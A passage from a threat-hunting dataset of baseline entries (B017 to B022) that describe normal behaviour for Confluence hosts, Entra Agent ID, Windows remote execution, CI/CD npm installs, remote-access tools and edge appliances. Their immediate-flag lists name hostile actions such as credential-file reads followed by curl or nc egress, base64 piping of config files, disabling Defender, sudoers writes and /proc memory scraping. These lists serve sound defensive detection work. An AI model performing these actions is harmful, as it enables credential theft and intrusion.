complete**: (a) `cat`, `grep`, `awk`, `sed`, `less`, `head`, `tail`, `xxd`, `strings`, or `od` of any `server.xml`/`confluence.cfg.xml`/`setenv.sh` where the parent is an interactive shell (`bash`, `sh`, `zsh`) AND the SSH source IP is an F5 BIG-IP, a Confluence-facing reverse proxy, or any non-admin IP — this is the exact Microsoft KQL pattern; (b) reads of those files immediately followed by outbound network connections to a non-admin destination (curl/wget/nc/socat); (c) reads of those files by any UID OTHER than the documented `confluence`/`backup`/CM-agent users; (d) any access via base64-piped commands (`cat server.xml | base64`, `tar ... server.xml | base64`). **Immediate flags also include** chmod 777 on `/dev/shm` or `/tmp` from the Confluence host (the staging-prep behavior Microsoft observed) and any FTP client (`curl ftp://`, `lftp`, `ncftp`) initiated by the `confluence` user. This baseline directly enables [[H166]] (F5→Linux SSH pivot) and complements [[H161]] (Linux→DC NTLM relay). Cross-reference **T1078.002** (Valid Accounts: Domain Accounts — the `Jiraservices` AD account whose credentials were read from these files and then used for domain pivoting) and **T1190** (Exploit Public-Facing Application — the Confluence RCE that gave the attacker file-read access in the first place).",
    "tags": [
      "credential_access",
      "baseline",
      "linux",
      "atlassian",
      "confluence",
      "service_account",
      "config_files",
      "T1552.001"
    ],
    "techniques": [
      "T1552.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The attacker's entire pivot from web-tier compromise to domain compromise hinged on a small set of file reads — server.xml and confluence.cfg.xml contained the `Jiraservices` domain-account credentials in plaintext, and reading those files cost the attacker nothing once they had SSH on the Confluence box (Microsoft, May 22, 2026)\n- The detection signal is exceptionally clean once a baseline exists: the only legitimate readers are the JVM itself at startup, backup agents, and configuration-management runs — every other read is a candidate for credential theft. Without the baseline, every `cat server.xml` from an admin troubleshooting session is a false positive and the rule gets tuned to death\n- The same baseline doubles as a detection layer for the broader pattern: any vulnerability that yields arbitrary file-read on a Confluence/Jira/Bitbucket host (CVE-2022-26134, CVE-2023-22515, CVE-2023-22518, CVE-2024-21683, future CVEs) ends in the same place — reading these specific files — so the baseline pays back across many incidents rather than just the F5/Confluence one\n- Pairing the baseline with `[[H166]]` (F5→Linux SSH pivot) closes the chain end-to-end: the SSH origin signal tells you the session is anomalous, the config-file read signal tells you what they're after, and the post-read network activity tells you whether the credentials made it out of the host",
    "references": "- [MITRE ATT&CK T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)\n- [MITRE ATT&CK T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)\n- [Microsoft Security Blog - From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence](https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/)\n- [Atlassian - Creating a Dedicated User Account on the Operating System to Run Confluence](https://confluence.atlassian.com/doc/creating-a-dedicated-user-account-on-the-operating-system-to-run-confluence-255362445.html)\n- [Sigma Rule - Suspicious File Read by Java Process (Atlassian)](https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd)\n- [Red Canary Atomic Red Team - T1552.001 Credentials In Files](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md)\n- [Qualys - Atlassian Confluence Hardcoded Credentials Vulnerability (CVE-2022-26138)](https://blog.qualys.com/qualys-insights/2022/08/17/atlassian-confluence-questions-for-confluence-app-hardcoded-credentials-cve-2022-26138)\n- [Falco - File Integrity Monitoring on Linux](https://falco.org/docs/concepts/rules/default-rules/)",
    "file_path": "Embers/B017.md"
  },
  {
    "id": "B018",
    "category": "Embers",
    "title": "What does legitimate Microsoft Entra Agent ID activity look like in this tenant — which agent identity blueprints exist, which apps they inherit from, which roles and Graph permissions are normally assigned, which IPs and user-agents the agents call from, and how often they legitimately rotate or add credentials — so that an attacker injecting a client secret via `microsoft.graph.addPassword` or pivoting one agent's privileges to another blueprint becomes a high-fidelity outlier rather than indistinguishable from preview-stage churn.",
    "tactic": "Persistence",
    "notes": "Platform: Entra ID (Microsoft 365). Red Canary \"Investigating suspicious AI workflows in Microsoft Entra Agent ID: Autonomous agents\" (May 27, 2026) documented an attack pattern where a compromised agent identity assigned `AgentIdentityBlueprint.AddRemoveCreds.All` added client-secret credentials to unrelated blueprint principals via `POST /servicePrincipals/{id}/addPassword`, enabling persistence on any production blueprint inheriting from that one. Entra Agent ID is preview-stage as of May 2026, so the schema is in flux — `AuditLogs` do not yet populate `InitiatedBy.app.agentType` or `blueprintId`, requiring Graph enrichment via the `servicePrincipal` resource (`@odata.type == \"#microsoft.graph.agentIdentity\"`) to even identify what is or isn't an agent. **Data collection (30 days)** — for every service principal in the tenant where the Graph-enriched `@odata.type` is `agentIdentity`, plus every blueprint principal (parent service principal carrying the `AgentIdentityBlueprint.AddRemoveCreds.All` role), collect: (1) the agent's `objectId`, `appId`, `appOwnerOrganizationId`, and blueprint inheritance chain; (2) every app role assignment via `AuditLogs` activity `\"Add app role assignment to service principal\"` with `TargetResources.modifiedProperties` field set; (3) every credential lifecycle event via `AuditLogs` activity `\"Update application – Certificates and secrets management\"` (KeyId, StartDate, EndDate, DisplayName, who/what InitiatedBy); (4) every sign-in via `AADServicePrincipalSignInLogs` capturing `IPAddress`, `LocationDetails`, `ResourceDisplayName`, `AppId`, `UniqueTokenIdentifier`, `ServicePrincipalCredentialKeyId`; (5) every Graph API call via `MicrosoftGraphActivityLogs` joined on `SignInActivityId` capturing `RequestUri`, `RequestMethod`, `ResponseStatusCode`, `UserAgent`. **Build the allowlist**: per agent identity, document the set of (a) expected IP ranges (cloud egress NATs of the Agent runtime — typically a Microsoft-owned ASN, an enterprise app gateway, or a small set of customer-owned IPs); (b) expected user-agent strings (Agent SDK signatures); (c) expected Graph endpoints (read-only against the inherited resources only); (d) expected credential cadence (managed-identity-style automatic rotation, typically monthly, via the platform — never via human-token-driven `addPassword`). **Deliverable format**: a per-agent allowlist of `(blueprintId, appId, expected-IPs, expected-UAs, expected-Graph-endpoints, expected-credential-rotation-mechanism)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) any `microsoft.graph.addPassword` (or `AuditLog` activity `\"Update application – Certificates and secrets management\"` with `KeyDescription` containing `AgentCred-*` or similar) where the target service principal's `appId` does NOT match the `InitiatedBy.app.servicePrincipalId` (i.e. an agent adding a credential to a DIFFERENT principal than itself) — this is the exact Red Canary intrusion pattern; (b) any sign-in for an agent identity from an IP not in the documented Agent runtime ranges; (c) any Graph call from an agent to a resource OUTSIDE its blueprint inheritance chain (the `servicePrincipal` resource lists inherited roles — anything outside that surface is unexpected); (d) any role assignment of `AgentIdentityBlueprint.AddRemoveCreds.All` to any new principal — this is the keys-to-the-kingdom permission for the entire Agent ID surface and should be assigned to a hand-counted set of principals only. **Immediate flags also include** any new service principal with `@odata.type == \"#microsoft.graph.agentIdentity\"` created by a non-Agent-platform principal, and any `addPassword` on a blueprint principal during non-business hours from a non-Microsoft ASN. This baseline directly enables a future Flames hunt on \"agent-to-non-inherited-resource Graph calls\" and complements existing Entra hunts on service principal credential injection. Cross-reference **T1098.001** (Account Manipulation: Additional Cloud Credentials — the parent technique that addPassword instantiates for agent identities), **T1136.003** (Create Account: Cloud Account — the agent-identity creation event itself), and the Microsoft Defender XDR built-in alert `\"AgentIdentitySuspiciousCredentialAdd\"` (preview) for high-confidence corroboration.",
    "tags": [
      "persistence",
      "baseline",
      "entra_id",
      "cloud",
      "agent_identity",
      "service_principal",
      "ai_workflow",
      "credential_injection",
      "T1098.003"
    ],
    "techniques": [
      "T1098.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Entra Agent ID is a brand-new identity class (preview as of May 2026) and the audit-log schema is incomplete — `agentType` and `blueprintId` aren't populated yet — so the only way to make detection work is to enrich every sign-in and audit event with Graph metadata and build a per-agent expected behavior profile up front, before there's enough volume for any vendor-built rule to fire reliably\n- The attacker primitive Red Canary documented (an agent identity assigned `AgentIdentityBlueprint.AddRemoveCreds.All` injecting a client secret into a blueprint it doesn't own) is a one-API-call full-tenant compromise of every downstream agent. Without a baseline that says \"this agent only ever adds credentials to its own appId via the platform's rotation flow,\" every credential add looks like normal operations and the attack lives forever\n- The `AddRemoveCreds.All` role is the agent-tier equivalent of `Application.ReadWrite.All` for classic apps — the same logic that says \"alert on any new principal with `Application.ReadWrite.All`\" applies, but the new role name isn't on most allowlists yet. Capturing the hand-counted assignee list as a baseline output gives the org a tripwire that fires immediately on any future expansion\n- The IP/UA fingerprint of a legitimately-running agent is much tighter than for a human identity — the Agent runtime calls from a small set of platform-managed egress IPs with a stable SDK user-agent — so an attacker driving the same agent identity from a residential or VPS IP is a near-perfect outlier, but only if the baseline of \"what does normal agent traffic look like\" exists to compare against",
    "references": "- [MITRE ATT&CK T1098.003 - Account Manipulation: Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003/)\n- [MITRE ATT&CK T1136.003 - Create Account: Cloud Account](https://attack.mitre.org/techniques/T1136/003/)\n- [Red Canary - Investigating suspicious AI workflows in Microsoft Entra Agent ID](https://redcanary.com/blog/threat-detection/entra-id-ai-workflows/)\n- [Microsoft Learn - Microsoft Entra Agent ID overview (preview)](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/agent-identity-overview)\n- [Microsoft Learn - Service principal authentication audit logs](https://learn.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-sign-ins)\n- [Microsoft Threat Intelligence - Midnight Blizzard service principal credential abuse](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)\n- [Azure-Sentinel - Detection of AddPassword on service principal](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/NewPasswordAddedByUserOrApp.yaml)\n- [Detection.FYI - Service principal credential addition patterns](https://detection.fyi/)",
    "file_path": "Embers/B018.md"
  },
  {
    "id": "B019",
    "category": "Embers",
    "title": "What does legitimate remote administrative execution look like across this Windows estate — which service accounts and IPs use which remote-exec mechanism (PsExec, WMIC `/node:`, `sc \\\\host create`, `schtasks /s`, `Invoke-Command`, `Invoke-WmiMethod`), at what cadence, against which target hosts, with what parent-process lineage — so that Gentlemen-style multi-mechanism fan-out (3+ distinct remote-exec tools from one source host to the same target host within 5 minutes — see [[H170]]) becomes a high-fidelity outlier rather than a noisy alert constantly tripping on Ansible/SCCM/Tanium/admin runbooks.",
    "tactic": "Lateral Movement",
    "notes": "Platform: Windows. Driven by Microsoft Security Blog \"The Gentlemen ransomware: Dissecting a self-propagating Go encryptor\" (May 28, 2026) showing Gentlemen's `--spread` routine fires 21 lateral-move operations per target across six different mechanisms. The single biggest reason ransomware lateral-move detections get tuned to death is that admin tooling — Ansible WinRM, SCCM client push, Tanium, BigFix, internal runbook PowerShell — uses the exact same primitives at scale. Without a baseline of which service accounts legitimately use which mechanism, against which targets, any rule fires hundreds of times per day. **Data collection (30 days)** — across every Windows host, collect for each remote-execution event: (1) source host and source process (parent + grandparent lineage); (2) authenticating account (UPN, SID, machine-account vs human, service-tier classification); (3) target host (FQDN, OU, role, tier — workstation/server/DC); (4) mechanism (`psexec.exe`, `paexec.exe`, `wmic /node:`, `sc \\\\target create`, `schtasks /s /create`, `Invoke-Command -ComputerName`, `Invoke-WmiMethod -ComputerName`, `winrs`, `winrm.cmd quickconfig`, `Enter-PSSession`, `New-PSSession`, `New-CimSession`); (5) full command-line / script block; (6) source IP if RPC/SMB/WinRM crossed network boundaries; (7) wall-clock time, inter-event interval, and target-host fan-out count per source. **Sources**: Defender for Endpoint `DeviceProcessEvents` + `DeviceNetworkEvents`; Windows Security Event IDs **4688** (process create — captures `psexec`/`wmic`/`sc`/`schtasks`), **4624** (logon — type 3 for network, type 10 for RDP), **5145** (file share access — for `\\\\target\\share$` and `\\\\target\\ADMIN$`); Windows Application Event ID **7045** (service installed on target); PowerShell Operational Event IDs **4103** (module logging) and **4104** (script block — `Invoke-Command`/`Invoke-WmiMethod` calls); WinRM Operational Event IDs **161**/**169**/**193**. **Build the allowlist**: per (source-account, mechanism) pair, document the set of approved (target-OU, normal-cadence, normal-target-count, normal-parent-process). Typical legitimate populations: SCCM client-push uses WMI and SMB ADMIN$ from a small set of MECM site-server accounts; Ansible uses WinRM from one or two controller hosts to broad target sets; admin runbooks use `Invoke-Command` from named SREs during change windows; vulnerability scanners use WMI in read-only modes; backup jobs use SMB to file shares only. **Deliverable format**: a per-account allowlist of `(mechanism, target-OU, cadence, max-targets-per-hour, expected-parent-process)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) **3+ distinct remote-exec mechanisms from one source host to the same destination host within 5 minutes** — this is the Gentlemen fingerprint and is essentially never legitimate (CM tools standardize on one mechanism per product); (b) any `psexec.exe` or `paexec.exe` execution where the source account is a human user (not a CM service account); (c) any `sc \\\\target create` where the service binary path starts with `\\\\` (UNC payload pull) or `C:\\Temp\\`; (d) any `schtasks /s /create /ru SYSTEM /tr` where the task name contains `gentlemen`, `Update`, `Def`, `Spread`, or matches known Gentlemen task names from [[H170]]; (e) any `Invoke-Command` or `Invoke-WmiMethod` whose script block contains `Set-MpPreference -DisableRealtimeMonitoring` or `Add-MpPreference -ExclusionPath`; (f) any service account authenticating to more than its baseline-95th-percentile target count within one hour. **Immediate flags also include** any Windows service installed (Event 7045) on a target where the binary path is UNC + ends in a non-Microsoft-signed Go-compiled binary, and any `wmic /node:<target> process call create` whose command-line spawns `powershell` with a base64-encoded script block. This baseline directly enables [[H170]] (Gentlemen self-propagation hunt) and complements any future ransomware-orchestration detection. Cross-reference **T1047** (Windows Management Instrumentation), **T1059.001** (PowerShell), **T1543.003** (Windows Service), **T1053.005** (Scheduled Task), and **T1570** (Lateral Tool Transfer — the `\\\\host\\share$` payload staging is exactly this).",
    "tags": [
      "lateral_movement",
      "baseline",
      "windows",
      "psexec",
      "wmi",
      "powershell_remoting",
      "scheduled_task",
      "service_creation",
      "admin_shares",
      "T1021.002"
    ],
    "techniques": [
      "T1021.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Every ransomware self-propagation routine (Gentlemen, Black Basta, Akira, Play, Royal, LockBit Black) uses some combination of PsExec + WMIC + sc + schtasks + PowerShell Remoting because these are the universal Windows admin primitives, and every CM tool legitimately uses the same primitives at scale — so detection without a baseline is either silent (threshold too high) or drowning (threshold too low). The baseline is the only thing that makes ransomware lateral-move detection operational\n- The \"3+ mechanisms from one source to the same target in 5 minutes\" signal that [[H170]] depends on is high-precision only when the baseline confirms which source/target/mechanism combinations are legitimate — SCCM uses WMI plus SMB-ADMIN$ but never schtasks, Ansible uses WinRM but never sc.exe, named-SRE-runbooks use Invoke-Command but rarely PsExec. Without that ground truth, the rule fires on every SCCM client-push cycle\n- The baseline pays back across more than just Gentlemen: any future ransomware family or APT operator that wants to move laterally without standing up new tooling will reuse the same six primitives, and the same baseline tells you which (account, mechanism, target) tuples are out-of-pattern regardless of the specific TTPs used. The baseline is a load-bearing detection layer for the entire lateral-movement chapter of every IR engagement\n- Pairing the baseline with [[H170]] closes the chain — the multi-mechanism fan-out signal identifies the orchestrator host, the Defender-disable signal identifies hosts that have been blinded, and the persistence-fingerprint signal ([[H170]] core query) identifies fully encrypted hosts, so the same incident can be reconstructed end-to-end from three orthogonal data points rather than waiting for the encryption-marker file to appear",
    "references": "- [MITRE ATT&CK T1021.002 - SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)\n- [MITRE ATT&CK T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)\n- [MITRE ATT&CK T1570 - Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/)\n- [Microsoft Security Blog - The Gentlemen ransomware: Dissecting a self-propagating Go encryptor](https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/)\n- [SpecterOps - Detecting PsExec, paexec, and Sysinternals admin tools at scale](https://posts.specterops.io/)\n- [Sigma Rule - Suspicious Use of PsExec via Remote SC.exe](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sc_create_remote_service.yml)\n- [Red Canary - Threat Detection Report on PsExec lateral movement patterns](https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/)\n- [Microsoft Configuration Manager - Client push installation accounts and network traffic](https://learn.microsoft.com/en-us/mem/configmgr/core/clients/deploy/plan/security-and-privacy-for-clients)",
    "file_path": "Embers/B019.md"
  },
  {
    "id": "B020",
    "category": "Embers",
    "title": "What does a legitimate dependency install on this org's self-hosted CI/CD runners actually look like — which interpreters and child processes does `npm install`/`npm ci` (and `pip`, `yarn`, `pnpm`) normally spawn, from which paths, reaching which network destinations and reading which credential/secret files — so that the Red Hat npm \"Miasma\" behaviors (a Bun runtime executing from `/tmp`, a `/proc` memory scrape of `Runner.Worker`, a passwordless-sudoers write, IMDS access from a package hook) stand out as outliers instead of drowning in normal build noise.",
    "tactic": "Execution",
    "notes": "Platform: Linux (self-hosted GitHub Actions / GitLab / Jenkins runners; the same baseline applies to containerized build pods). Driven by Microsoft Security Blog \"Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign\" (June 2, 2026), which showed a compromised dependency abusing `preinstall` lifecycle hooks and a `node → shell → bun` chain (Bun downloaded to `/tmp/b-*/bun`) to evade Node-focused monitoring, then scraping runner memory and republishing packages. Every primitive the campaign used (interpreter execution, outbound fetch, file reads) also occurs constantly during *legitimate* builds — so detection of the malicious variant is impossible without a per-runner baseline of normal install behavior. **Data collection (30 days)** — on every self-hosted runner, for each package-install and build job, collect: (1) full process tree under the runner agent (`Runner.Worker`/`Runner.Listener` → `node`/`npm`/`npx`/`yarn`/`pnpm`/ `pip` → children), including parent/grandparent lineage and whether a lifecycle hook (`preinstall`/`postinstall`/`prepare`) spawned it; (2) every executable path actually run, flagging any interpreter or binary executed from `/tmp`, `/dev/shm`, `/var/tmp`, or a world-writable path (e.g. a dynamically downloaded `bun`); (3) outbound network destinations during install (registries `registry.npmjs.org`, `pypi.org`, package CDNs, `github.com/oven-sh/bun/releases`) plus any hit on cloud metadata `169.254.169.254`/`169.254.170.2`; (4) credential and secret file/path access (`~/.npmrc`, `~/.aws`, `~/.azure`, `~/.kube`, `~/.ssh`, `~/.docker`, `/var/run/secrets/kubernetes.io/...`); (5) any write to `/etc/sudoers*`, `/etc/hosts`, or `/etc/cron*`; (6) any cross-process memory read (`/proc/<pid>/mem`, `process_vm_readv`, `ptrace`). **Sources**: MDE for Linux `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents`; Linux `auditd` (execve, connect, open of sudoers/proc-mem); eBPF/Falco runtime events on the runner; GitHub Actions / GitLab job logs and workflow audit. **Build the allowlist**: per repo/pipeline, the set of (interpreters, child binaries, executable paths, registry+CDN destinations, credential files) that a clean build legitimately touches — most pipelines resolve to a small, stable set. **Deliverable format**: a per-runner / per-pipeline baseline of `(expected interpreters, allowed exec paths, allowed install destinations, expected credential reads, normal job duration)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) any interpreter executed from `/tmp`, `/dev/shm`, or `/var/tmp` (e.g. `/tmp/b-*/bun`) — see [[H175]]/[[H176]] context; (b) any write to `/etc/sudoers` or `/etc/sudoers.d/` by `node`/`bun`/`npm`/`sh`/ `tee` — see [[H175]]; (c) any `/proc/<pid>/mem` read or `grep -aoE` carving `\"value\"...\"isSecret\":true` — see [[H176]]; (d) IMDS access (`169.254.169.254`) from a `node`/`bun`/`npm` process during install; (e) a `node`→`sh`→`bun` (or any interpreter→shell→alternate-runtime) lineage during a package install; (f) creation of a public source repo or commits authored as `github-actions@github.com` from a runner outside the normal release workflow. **Immediate flags also include** Bun/Deno runtime downloaded mid-install from `github.com/oven-sh/bun/releases` by a Node parent, and any package install that opens `~/.aws`/`~/.kube`/ `~/.ssh` when the pipeline has no cloud-deploy step. This baseline directly enables [[H175]] (sudoers injection), [[H176]] (Runner.Worker memory scrape), and complements [[H173]] (typosquat IMDS hunt). Cross-reference **T1548.003** (sudo escalation), **T1003.007** (proc memory scrape), **T1552.005** (IMDS), and **T1059.004** (the shell layer in the runtime-switch evasion chain).",
    "tags": [
      "baseline",
      "linux",
      "ci_cd",
      "supply_chain",
      "npm",
      "github_actions",
      "dependency_install",
      "runner_hardening",
      "T1195.001"
    ],
    "techniques": [
      "T1195.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Supply-chain execution hides inside an event that happens thousands of times a day — `npm install` — so the only way to make the malicious variant detectable is to know what a clean install looks like on *this* org's pipelines. The Miasma campaign deliberately reused legitimate primitives (interpreters, outbound fetches, file reads); a per-pipeline baseline is what converts \"another build ran\" into \"this build spawned a runtime from /tmp and read /proc memory,\" which is the whole game\n- The single most generalizable signal the baseline establishes is the set of executable paths a build legitimately runs from. Real toolchains run from package directories, `node_modules/.bin`, and system paths — never from `/tmp`, `/dev/shm`, or `/var/tmp`. Once that's baselined, the runtime-switch evasion (Node downloading and running Bun from a temp path to escape Node instrumentation) becomes a one-line outlier rule that catches not just Miasma but any future alternate-runtime evasion\n- The baseline is what makes the paired Flames hunts ([[H175]], [[H176]]) operational rather than noisy: knowing which pipelines legitimately read cloud credentials, write to system config, or query IMDS lets those hunts fire only on the genuinely anomalous case. Without it, \"node read ~/.aws\" looks identical for a deploy job and a credential thief\n- Self-hosted runners are the highest-value, lowest-instrumented hosts in most engineering orgs — they hold OIDC tokens, publish rights, and cluster credentials, yet rarely run the EDR that laptops do. Investing 30 days in a runner-behavior baseline pays back across the entire CI/CD attack surface and survives specific-campaign rotation, because it describes normal rather than chasing the current bad",
    "references": "- [MITRE ATT&CK T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/)\n- [MITRE ATT&CK T1059.004 - Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)\n- [Microsoft Security Blog - Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign](https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/)\n- [GitHub - Security hardening for self-hosted runners](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners)\n- [Falco - Runtime detection rules for CI/CD and container workloads](https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml)\n- [Elastic Security - Baselining process execution on Linux build infrastructure](https://www.elastic.co/security-labs/)\n- [SLSA - Supply-chain Levels for Software Artifacts: build integrity and provenance](https://slsa.dev/spec/v1.0/levels)",
    "file_path": "Embers/B020.md"
  },
  {
    "id": "B021",
    "category": "Embers",
    "title": "What does legitimate external remote access actually look like in this org — which RMM / remote-support tools are sanctioned, from which hosts and paths they run, which users and source geographies use the SSL VPN / Citrix / Windows 365 VDI, and what BYOD-to-VDI patterns are normal — so that UNC3753 (Luna Moth) behaviors (an unsanctioned RMM installed during a screen-share, a VDI logon from a freshly compromised personal laptop, a burst of new external-remote-access sessions) stand out as outliers instead of drowning in normal remote-work noise.",
    "tactic": "Persistence",
    "notes": "Platform: Windows / M365 / network (self-managed and cloud VDI; applies to SSL VPN, Citrix, Windows 365, AVD, and RMM agents). Driven by Mandiant/GTIG \"Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms\" (UNC3753 / Luna Moth, June 5, 2026), where operators abused External Remote Services (T1133) — joining screen-shares, then pivoting through corporate VDI via native clients (`Windows365.exe`, Citrix) from compromised personal/BYOD laptops, and standing up RMM (AnyDesk, Bomgar, Zoho Assist, SuperOps) for persistence. Every primitive (VDI logon, RMM agent, remote session) also occurs constantly during legitimate remote work, so the malicious variant is only visible against a per-org baseline. **Data collection (30 days)** — (1) the **sanctioned RMM/remote-support inventory**: which products are approved, their normal install paths (`%ProgramFiles%`), signing certs, and the deployment mechanism that installs them; (2) per-user/per-host VDI and VPN access: source IP/ASN/geo, device-compliance/MFA state, client used (`Windows365.exe`, Citrix Workspace), normal logon hours; (3) RMM agent execution telemetry (Sysmon **Event ID 1** / Security **4688**: image, path, ParentImage, signer); (4) M365 sign-in logs / Unified Audit Log for remote-access app usage and new device registrations; (5) VPN/VDI gateway auth logs (success/volume per user). **Sources**: Sysmon 1/3, Security 4688/4624 (LogonType 10/Remote Interactive), MDE `DeviceProcessEvents`/`DeviceLogonEvents`, Entra ID sign-in logs, VPN/Citrix/Windows 365 gateway logs. **Build the allowlist**: the set of (approved RMM products + paths + signers), (normal VDI/VPN source ASNs/geos per user), and (expected remote-access logon patterns). **Deliverable format**: a per-user / per-host baseline of `(sanctioned remote-access tools, allowed install paths, normal VPN/VDI source IP-ASN-geo, normal hours, expected MFA/compliance state)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) any RMM/remote-access binary spawned by a collaboration app (`Teams.exe`/`Zoom.exe`/`quickassist.exe`) — see [[H182]]; (b) any RMM running from `%TEMP%`/`Downloads` instead of Program Files; (c) an RMM product **not** on the sanctioned list (AnyDesk/Bomgar/Zoho/SuperOps where unsanctioned); (d) VDI/VPN logon from a never-before-seen device or residential/foreign ASN for that user; (e) curl-delivered MSI installs of RMM — see [[H181]]. This baseline directly enables [[H181]] (curl->msiexec RMM) and [[H182]] (vishing->RMM) by letting them fire only on the genuinely unsanctioned/anomalous case. Cross-ref **T1219** (Remote Access Software), **T1021.001** (RDP/Terminal Services), **T1078** (Valid Accounts on the VDI pivot).",
    "tags": [
      "baseline",
      "windows",
      "m365",
      "remote_services",
      "rmm",
      "vdi",
      "vpn",
      "luna_moth",
      "T1133"
    ],
    "techniques": [
      "T1133"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- External Remote Services is the hardest class of technique to alert on cold, because the malicious use is byte-for-byte the same action as a remote employee doing their job — an RMM agent, a VDI logon, a VPN session. The only thing that converts \"someone connected remotely\" into \"an attacker connected remotely\" is a baseline of what *this* org's sanctioned remote access looks like.\n- The single most generalizable signal the baseline establishes is the sanctioned-RMM inventory plus normal install paths and parents. Once that exists, Luna Moth's screen-share-installed RMM becomes a one-line outlier (unsanctioned product, wrong path, collab-app parent) that also catches whatever RMM the next intruder brings.\n- The baseline is what makes the paired Flames hunts ([[H181]], [[H182]]) operational rather than noisy: knowing which users legitimately use which remote tools, from which source ASNs and on which devices, lets those hunts fire only on the genuinely anomalous install or logon instead of on every help-desk session.\n- Remote-access infrastructure (VPN, Citrix, Windows 365, RMM) is high-value and heavily used, so a 30-day investment in baselining it pays back across the whole initial-access and persistence surface and survives campaign-specific rotation, because it describes the org's normal rather than chasing the current bad indicators.",
    "references": "- [MITRE ATT&CK T1133 - External Remote Services](https://attack.mitre.org/techniques/T1133/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [MITRE ATT&CK T1219 - Remote Access Software](https://attack.mitre.org/techniques/T1219/)\n- [Red Canary - Detecting RMM software and other remote admin tools](https://redcanary.com/blog/threat-detection/rmm-software/)\n- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)\n- [CISA - Guidance on protecting against the misuse of legitimate RMM software](https://www.cisa.gov/resources-tools/resources/protecting-against-malicious-use-remote-monitoring-and-management-software)\n- [Microsoft Learn - Entra ID sign-in logs and detecting anomalous remote access](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins)",
    "file_path": "Embers/B021.md"
  },
  {
    "id": "B022",
    "category": "Embers",
    "title": "What does legitimate management-plane access to this org's EDR-blind edge appliances (firewalls, NAS, Egnyte Storage Sync, VPN concentrators) actually look like — which accounts authenticate (including built-in/default service accounts like `egnyteservice`), from which source IPs, over which protocols (SSH/HTTPS-admin), at what times, and what the appliance's normal cron/rc/sudoers and outbound-network state is — so that VerdantBamboo (BRICKSTORM) behaviors (default-account SSH from the SSL VPN, a new cron/rc persistence entry, sudo-tee privesc, appliance-sourced web C2) stand out against a known-good baseline instead of hiding in devices nobody watches.",
    "tactic": "Persistence",
    "notes": "Platform: Linux / BSD network & storage appliances (firewall, NAS, Egnyte Storage Sync, VPN). Driven by Volexity \"VerdantBamboo: Just Another BRICKSTORM in the Firewall\" (June 4, 2026), where a Chinese actor abused **default/built-in accounts** (T1078.001 — the `egnyteservice` account with MSP-stolen, modified credentials) to SSH into appliances from the org web-based SSL VPN, then persisted via cron/rc and escalated through a misconfigured sudoers (`tee` as root). These appliances lack EDR, so the only way to detect the intrusion is a baseline of normal management access and normal device state. **Data collection (30 days, per appliance)** — (1) **authentication baseline**: every account that logs in (especially built-in/service accounts such as `egnyteservice`, `admin`, `root`), auth method (SSH key vs password), **source IP/ASN/geo**, and normal hours — appliance auth/SSH logs, VPN gateway logs, syslog; (2) **device-state snapshot**: known-good `/etc/crontab` + `/etc/cron.d/*` + `/etc/rc.d/*` contents, sudoers/sudoers.d rules, listening services, and installed-binary inventory (hash the vendor package tree); (3) **outbound network baseline**: the small set of vendor update/telemetry endpoints the appliance management IP legitimately contacts. **Sources**: appliance syslog / SSH auth logs, SSL VPN + firewall admin logs, NetFlow/Zeek from the appliance management VLAN, 